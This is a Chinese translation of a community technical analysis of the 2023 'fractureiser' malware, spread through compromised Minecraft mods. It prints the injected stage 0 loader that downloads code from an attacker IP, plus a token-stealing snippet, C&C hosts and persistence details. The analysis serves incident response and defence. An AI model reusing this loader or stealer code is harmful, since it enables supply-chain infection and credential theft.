Last updated at Jun 9th, 2023  
最后更新于二〇二三年六月九日

# 技术分析

## 传播

一些整合包在作者不知情的情况下突然发布了新版，而这些新版整合包则包含了含恶意软件的模组。当事方在发现后旋即存档了这些版本，这意味着「通过 CurseForge 网页界面无法访问这些版本，只可能通过 API 访问」。

这些含恶意软件的模组的上传时间可追溯到过去数周前。其中，大部分文件的上传者均为一次性小号，用户名也明显是随机生成的，
可能是传染的「种子」。Luna Pixel Studios 的开发者之一为更新整合包而试用了其中一个模组，其因此被感染。

### 已知受影响的模组及插件

注：该列表**并不完整**。该列表是在调查初期整理出来的，但在我们意识到该恶意软件的传染规模比想象中要大得多时，
追踪个案已然毫无价值。该列表目前仅因历史考量而保留。

同时，亦可参考 [CurseForge 给出的受影响项目列表](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)。

|模组/插件|链接|SHA1|「上传者」|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (removed)](https://dev.bukkit.org/projects/havenelytra/files/4551105)   [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (removed)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (removed)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (removed)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Integrations Bug fix|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org/projects/floating-damage (removed)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (removed)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax 整理了这个列表：https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

可能的受影响项目：Sophisticated Core、Dramatic Doors、Moonlight lib、Union lib

## 阶段 0（被感染的模组文件）

受影响的模组或插件的入口类中，会多出一个 `static void` 方法，并在同一个类的静态初始化块（译注：`static {}` 块，或者说，`<clinit>` 方法）中调用。对于 DungeonZ，此方法名为 `_d1385bd3c36f464882460aa4f0484c53`，位于 `net.dungeonz.DungeonzMain`。对于 Skyblock Core， 此方法名为 `_f7dba6a3a72049a78a308a774a847180`，位于 `com.bmc.coremod.BMCSkyblockCore`。对于 HavenElytra，这段代码则是直接插入了 `valorless.havenelytra.HavenElytra` 的静态初始化块中，而正常版本中该类并未使用静态初始化块。

该方法的代码存在一定程度的混淆：其使用了 `new String(new byte[]{...})` 来构造 `String` 而非直接使用字面量（String literal）。

下列代码来自由 D3SL 提供的 `Create Infernal Expansion Plus` 样本，其为正常的 `Create Infernal Expansion Compat` 模组加上恶意代码植入其入口类后形成：

```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

这段代码：

1. 创建 `URLClassLoader` 对象，该 `URLClassLoader` 会从 `http://[85.217.144.130:8080]/dl`（[shodan](https://www.shodan.io/host/85.217.144.130)）下载并加载类。
2. 透过 1. 中所述 `ClassLoader` 加载名为 `Utility` 的类。此过程会联网下载文件。
3. 调用 `Utility` 类的 `run` 方法，传入一字符串作为实参。每个受感染模组在此处传入的实参均不相同（！），例如：
    * Skyblock Core：`-74.-10.78.-106.12`
    * Dungeonz：`-114.-18.38.108.-100`
    * HavenElytra：`-114.-18.38.108.-100`
    * Vault Integrations：`-114.-18.38.108.-100`

该参数会在阶段 1 中转化为字节流，并写入一名为 `.ref` 的文件中。表面上看，这是作者追踪感染路径的方式。

该阶段所创建的 `ClassLoader` 对象硬编码了目标 URL，并未使用阶段 1 中使用的 CloudFlare URL。在该 IP 地址下线后，**我们已知的**阶段 0 感染代码将无法正常工作。

## 阶段 1（`dl.jar`）

SHA-1：`dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[该文件的反编译结果可在此查阅](../decomp)。

`Utility.run` 在开始执行前，首先会检查系统属性 `neko.run` 是否已有对应的值（译注：`System.getProperty(String)` 返回值非空）。若已设定有对应的值，程序会**立即停止运行**。若没有，则会将其值设定为空字符串，并继续执行。表面上看，这是恶意软件防止在某些情况下执行多次的手段，例如在存在多个受感染模组的情况下。**此行为不能用作可靠的「紧急停止开关」（Kill Switch），因为阶段 1 代码需联网获取，因此随时可能发生变化。**

然后，该程序试图访问 `85.217.144.130` 以及一个 CloudFlare 域名（`https://files-8ie.pages.dev/ip`）。我们已就此向 CloudFlare 提交滥用举报。这个 CloudFlare Pages 域名是用来获取指挥控制（Command & Control，下简称 C&C）服务器 IP 地址的。若前述第一个 IP 地址失去响应，这个 URL 将会返回一串 IPv4 地址的二进制表达。

**该 C&C 服务器 IP 地址在其服务器提供商收到滥用举报后便被切断公网连接（译注：原文 nullrouted，意为路由到黑洞）。我们未来仍需关注该 CloudFlare Pages 域名，以确认是否有新的 C&C 服务器上线。我无法想象攻击者居然没为此做好准备。** 我们在此感谢 Serverion 的及时响应。

**CloudFlare Pages 域名已停止服务。** 一个新 C&C 服务器已上线，地址为 `107.189.3.101`。

阶段 1 随后会尝试持久化，过程如下：
1. 从服务器上下载阶段 2 文件（对于 Linux 是 `lib.jar`，对于 Windows 是 `libWebGL64.jar`）
2. 令阶段 2 文件开机自启动：
* 对于 Linux，其试图在 `/etc/systemd/system` 或 `~/.config/systemd/user` 中放置 `systemd` 的 unit 文件来达成自启动。
    * 在用户目录下放置的 unit 实际上不可能工作，因为该 unit 试图使用 user unit 中并不存在的 `multi-user.target`。
* 对于 Windows，其试图通过修改注册表达成自启动（`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`），若失败则会将其加入 `Windows\Start Menu\Programs\Startup` 目录中作为备用方案。

## 阶段 2（`lib.jar` 或 `libWebGL64.jar`）

已知 SHA-1 哈希值：
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863`（D3SL 早期上传版本）

阶段 2 使用了试用版 Allatori 混淆，入口类名为 `Bootstrap`。
此外，阶段 2 还包含了一名为 `h` 的类，用途似乎是实现简易通信，但除此之外并无实际内容。对其源码的重建尝试可在此找到：https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe

该程序启动后，会进行如下操作：
1. 打开 `9655` 端口，并添加 shutdown hook（译注：`Runtime#addShutdownHook(Thread)`，确保其在 JVM 退出时关闭。
2. 在硬盘上定位自身存在路径，并以其所在目录为工作目录执行后续代码。
3. 若存在 `.ref` 文件，读取其中存储的识别码。（译注：前文阶段 0 一节中所述的传参）
4. 开始下列循环：
    1. 通过 `https://[files-8ie.pages.dev]:8083/ip` 获取服务器地址，并建立连接
    2. 获取「是否继续检查更新」的 Flag，若为 false 则抛出异常（通过前述获取到的服务器地址上的 `1338` 端口完成）
    3. 若 2. 中 Flag 为 `true`，则获取一串哈希值，并与 `client.jar` 比较（如果有），并在判定需要更新后向服务器再回复一个字节的信息
    4. 若需要更新，将从服务器拉取并覆写/创建 `client.jar`，然后为其设置隐藏属性。
    5. 加载该 jar，调用 `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)` 方法
    6. 睡眠 5 秒钟（译注：`Thread.sleep(5000)`）

## 阶段 3（`client.jar`）

sha-1：`c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
sha-1：`e299bf5a025f5c3fff45d017c3c2f467fa599915`

`client.jar` 内含经过混淆的复杂代码，除普通 Java 程序外还有本地代码（native code）。

其中，包含本地代码的文件叫 `hook.dll`，反编译结果可在此查阅：https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c

其内含两个方法，方法名显示这两个方法均可通过 JNI 调用，因此这两个方法应是供 Java 代码调用的：
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

根据分析，这两个方法的功能可以顾名思义：
* 读取剪贴板内容
* 读取微软账号登录信息

代码中还找到了其试图进行下列操作的证据：
* **全盘扫描** JAR 文件，找出所有疑似 Minecraft 模组的文件（通过检测 Forge/Fabric/Quilt/Bukkit 完成），或[声明有入口类的文件](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)（即，大部分常规 Java 程序），并试图将这些文件感染为阶段 0 文件。
* 从大量网页浏览器中窃取 Cookie 和登录信息
* 将剪贴板中的加密货币钱包地址替换为其他地址，据信替换后的地址为攻击者所持有
* 窃取 Discord 登录信息
* 从一众启动器中窃取微软账号及 Minecraft 登录信息
* 窃取加密货币钱包

判定某一 jar 文件为模组/插件的方式如下：
* Forge（`dev/neko/e/e/e/A`）：恶意软件试图定位存在有 `@Mod` 注解的类，对于 Forge 模组来说此为必须。<!--（译注：在极端情况下，例如使用 `lowcodefml` 之类的 language provider 的情况下，未必存在 `@Mod` 注解，但此类情况数量极为稀少，且 `lowcodefml` 意味着并不存在可供感染的 Java class，从而 out of scope。）-->
* Bukkit（`dev/neko/e/e/e/C`）：恶意软件检查是否有类继承了 Bukkit 的 `JavaPlugin` 类
* Fabric/Quilt（`dev/neko/e/e/e/i`）：恶意软件检查是否有类实现了 `ModInitializer` 接口
* Bungee（`dev/neko/e/e/e/l`）：恶意软件检查是否有类继承了 BungeeCord 的 `Plugin` 类
* Vanilla（`dev/neko/e/e/e/c`）：恶意软件检查是否存在游戏客户端入口类 `net.minecraft.client.main.Main`

## 阶段 3（`unobf-client.jar`）

大约 2023-06-07 14:20 UTC 左右，有人发现阶段 3 的「客户端 jar」被意外更新成了未混淆的版本。
你可以在这里找到该 jar 的归档（译注：已经过反编译）：https://github.com/clrxbl/NekoClient

该文件的出现证实了此前根据混淆后的 `client.jar` 的分析而推导出的可疑行为/证据。

### 复制

该病毒/恶意软件通过自动处理对本机文件系统扫描得到的 jar 来实现自我复制。所有符合前述条件的 jar 都将会感染。扫描及恶意代码注入的相关代码可在此找到：[`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)

处理流程的具体要求可在此找到：[`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)

* `BungeecordPluginTemplate` 会定位实现了 `net/md_5/bungee/api/plugin/Plugin` 的类
* `FabricModTemplate` 会定位实现了 `net/fabricmc/api/ModInitializer` 的类
* `ForgeModTemplate` 会定位含有 `net/minecraftforge/fml/common/Mod` 注解的类
* `MinecraftClientTemplate` 会定位 `net/minecraft/client/main/Main.class` 以及 `net/minecraft/client/gui/GuiMultiplayer.class` 两个类
* `SpigotPluginTemplate` 会定位继承 `org/bukkit/plugin/java/JavaPlugin` 的类
* 若上述条件均不满足，[其将试图感染 jar 文件的 main 方法](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)（如果有的话）。

这些恶意代码会向正常文件中注入阶段 0 中所展示的后门逻辑。具体来说，这些代码首先存在于 `Loader` 类中的一个静态方法里，然后同一个包下的 `Injector` 类会负责将代码从 `Loader` 中提取出来，并注入目标类中，以完成感染。`Injector.loadInstallerNode(...)` 的返回值为描述了感染过程的 `MethodNode`。在获取到这个 `MethodNode` 后，程序只需要将代码注入目标类中即可。回到 [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) 中，我们可以看到其实现方式是调用 `Entry.inject(MethodNode)`。`inject` 方法还会在目标类的静态初始化块中增加对注入方法的调用，确保该方法一定会执行。有鉴于静态初始化块在类首次加载时一定会被调用，并且目标类是模组/插件类，我们可以判断，恶意代码的作者假设用户在整合包/服务器中安装受感染模组/插件后，这些代码一定会执行。注入完成后，程序会将感染后的类重新打包入 jar 中。

### 反沙盒技巧

在该恶意软件中出现了一个名为 `VMEscape` 的类，而这样的命名在基于 JVM 的恶意软件中并不常见。该类的会检查当前用户是否为 `WDAGUtilityAccount` 以判断其是否在 [Windows Sandbox](https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview) 中运行。若检查通过，该恶意软件会尝试脱离沙箱。

该尝试流程如下：

- 发起一新线程，循环执行下列操作：
  - 调用 `Files.createTempDirectory(...)` 新建临时目录。
  - 遍历系统剪贴板中的 `FileDescriptor` 对象，而其内容实为宿主机剪贴板内容
  - 创建一与原文件相似的快捷方式（**利用 SHELL32 中的图标**），该快捷方式则会启动恶意软件
  - 将原剪贴板内容替换为该快捷方式

由此，若用户将文件复制到别处，他们将会得到外观和原文件类似，但实际上会运行恶意软件的快捷方式。

### 窃取数据

**MSA Token**：有鉴于该「模组」针对其他 Minecraft 模组，窃取用于登录 Minecraft 的 MSA Token 当然再正常不过了。某些启动器会将 MSA Token 写入本地文件储存，而该恶意软件则会尝试读取这些文件。受此影响的应用有：

* 原版启动器（Mojang 启动器）（译注：似乎是指应用商店的那个）
* 旧版原版启动器（Mojang 启动器）
* PolyMC、Prism
* Technic
* Feather
* LabyMod（v3.9.59 及以下版本）
* 任何在 [Windows Credential Manager](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0) 里存储的 MSA Token

针对不同启动器窃取信息的逻辑（见 [`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java)）大体上一致，因为启动器保存登录信息的方式也类似。例如下列针对 LabyMod 的代码：

```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```
窃取 Feather/PolyMC/Prism 存储的登录信息的代码几乎完全相同。

针对原版启动器的策略还会处理 JSON 文件外的一层加密保护。

针对 Technic 的策略则是先使用 Java 内置的对象序列化（译注：`Serializable`、`ObjectInputStream`、`ObjectOutputStream`）读取，然后处理 `com.google.api.client.auth.oauth2.StoredCredential` 的包装。

**Discord token**：偷 Discord Token 这事可谓是众所周知了。除了登录令牌外，还会窃取支付信息、绑定手机号等。此功能影响原版 Discord 客户端、Canary、PTB 以及 Lightcord。相关代码：[`dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java`](https://github.com/clrxbl/NekoClient/blob/fd76c5f9d40d1e10de11f00a6b4e0cca3d6221a3/dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java)

**Cookies 及浏览器保存的登录凭证**：从各种受影响的浏览器中窃取 Cookies 和登录凭证信息。相关代码：[`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
  - Waterfox
  - Pale Moon
  - SeaMonkey
- Chrome
  - Edge
  - Brave
  - Vivaldi
  - Yandex
  - Slimjet
  - CentBrowser
  - Comodo
  - Iridium
  - UCBrowser
  - Opera
    - Beta
    - Developer
    - Stable
    - GX
    - Crypto
  - CryptoTab

## 阶段 3b（`dummyloader3.jar`）

阶段 3 在第二台 C&C 服务器上线后更新成了另一个 jar。

表面上看，这只是一个 SkyRage 更新器。SkyRage 是另一个 Minecraft 相关恶意软件，主要针对 BlackSpigot。

### 持久化

- Windows：task scheduler `MicrosoftEdgeUpdateTaskMachineVM`，相关文件 `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`
- Linux：`/bin/vmd-gnu`、`/etc/systemd/system/vmd-gnu.service`、service `vmd-gnu`

### 连接

- C&C 服务器：`connect.skyrage.de`
- 下载文件：`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqq`

### 动作

- `qqqqqqqqq` jar 会提取各种信息（浏览器 Cookies、Discord、Epic、Steam、以及加密货币钱包和密码管理器相关），然后更新器 jar 会将信息传回 C&C 服务器。
- 将剪贴板里的加密货币钱包地址替换为从 `95.214.27.172:18734` 获取的地址。
- 持久化（见上一节）
- 包含自动更新器，目前版本 932 (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### 映射表

下列代码为该样本的反混淆映射表，可在 Enigma 或任意支持 Enigma 映射表格式的工具中使用。

```
CLASS D Chat
CLASS E ChatChain
CLASS E$a ChatChain$ChainLink
CLASS F ClientChat
CLASS G EncryptionRequest
CLASS H EncryptionResponse
CLASS H$a EncryptionResponse$EncryptionData
CLASS J KeepAlive
CLASS L LoginPayloadResponse
CLASS O PluginMessage
CLASS O$1 BungeeCordProtocolVersionMapFunction
CLASS P SetCompression
CLASS R StatusResponse
CLASS T CryptocurrencyClipboardLogger
CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
CLASS U AutoRunPersistence
CLASS V InputStreamFileWriter
CLASS W OperatingSystem
CLASS X AutoUpdater
CLASS Y StacktraceSerializer
CLASS a MalwareClientConnectionHandler
CLASS b Main
    FIELD a intconst I
    FIELD a string0 Ljava/lang/String;
    FIELD a ipAddress Ljava/net/InetSocketAddress;
CLASS g MinecraftBot
CLASS h MinecraftBot2
CLASS o MinecraftFriendlyByteBuf
CLASS s MinecraftIPAddressResolver
CLASS t MinecraftPacketDecoder
CLASS y MinecraftPacketEncryption
```

### 抗反编译

该样本表面上利用了 class 文件的实现细节来诱使反编译器报错退出。此类问题可通过 [CAFED00D](https://github.com/Col-E/CAFED00D) 解决。CAFED00D 是一款可过滤存在结构问题的字节码解析器。在这之后剩下的唯一问题只有试用版 Allatori 产生的初步混淆。

# 其他信息

更多细节可在这份实时更新的阶段 3 逆向工程文档中找到：https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

第二台 C&C 服务器上线时，一份未混淆的阶段 3 jar 意外在此存活了大约 40 分钟。

主要文件服务器托管于于位于荷兰的 Serverion 公司；公司在收到滥用举报后已下线该服务器。


新的 C&C 服务器也已下线。时间：_2023-06-07 18:51 UTC_

除了 HTTP(S) 的 80/443 以及 SSH 的 22 端口，`85.217.144.130` 和 `107.189.3.101` 还开启了下列端口：

* 1337
* 1338（阶段 1 引用了此端口，用于创建 Debugger 连接）
* 8081（这是个 WebSocket 服务器，目前并无明显功能，也无恶意代码引用此端口）
* 8082（没人从这个端口里试出任何东西，也无恶意代码引用此端口）
* 8083（阶段 1 使用了此端口）

奇妙的是，fractureiser 的 Bukkit 用户页显示 "Last active Sat, Jan, 1 2000 00:00:00" https://dev.bukkit.org/members/fractureiser/projects/（最后一次活跃时间：2000 年 1 月 1 日（星期六）0 时 0 分 0 秒）

## 样本

请在 IRC 聊天室中请求样本的只读或读写权限。阶段 3「客户端」问的反编译结果可在此找到：https://github.com/clrxbl/NekoClient

## 反思

虽然现在讨论事后追踪有点为时尚早，这场面对恶意软件的失败业已揭示了 Minecraft 模组生态中的数个致命缺陷。本小节将用作头脑风暴区，思考我们遇到了哪些问题，以及应该如何改进。

#### 1. 模组仓库的审核机制不完善

CurseForge 和 Modrinth 在「审核」模组的时候究竟在审些什么？我们作为社区应该对此有充分的了解，而不是将希望全寄托在「隐晦式安全」（Security through obscurity）上。

我们是否需要进行某种形式的静态分析？（williewillus 表示他有有若干想法）

#### 2. 模组缺少数字签名

和广义上的软件业的习惯不同，模组开发者通常不会在发布并上传模组的时候，使用签名用密钥为模组签名，以证身份。如果我们有一套签名以及公钥分发/信任机制，类似今天 CurseForge 账号被盗这样的事件就不至于落到这个地步。

然而，数字签名本身产生更大的问题：如何建立对密钥的信任？「这个 jar 有这个签名」这个事实不能只局限于 CurseForge/Modrinth 之内，还必须要让模组加载器和用户知道，并能独立验证签名的有效性。
Forge 数年前就已在尝试引入对签名机制的要求，然而结果不甚理想。

#### 3. 缺少可重现构建（Reproducible Build）

Minecraft 相关工具链只能用「一团糟」来形容，这些工具链构建出的产物通常也无法重现。使用动态 `-SNAPSHOT` 版本号的构建脚本随处可见，其结果自然也不可能复现，进而导致无法对构建流程进行审计（Audit）。

在未来，出现使用 Gradle 插件作为攻击媒介的恶意软件并非完全不可能。

#### 4. Minecraft 本身缺少沙箱保护

Java 版的模组开发一向都可以使用整个 Java 生态的能力，然而这只是这把双刃剑中的其中一面，另一面则是给了恶意代码大开杀戒的可乘之机。
Minecraft 本身并无任何形式的沙箱保护，服务器通常也不会在沙箱中运行，除非服主有足够多的服务器运维相关知识。

要实现严丝合缝的沙箱保护绝非易事，尤其是在 Linux 这种 SELinux/AppArmor 这种用户体验差到根本没人用的地方。
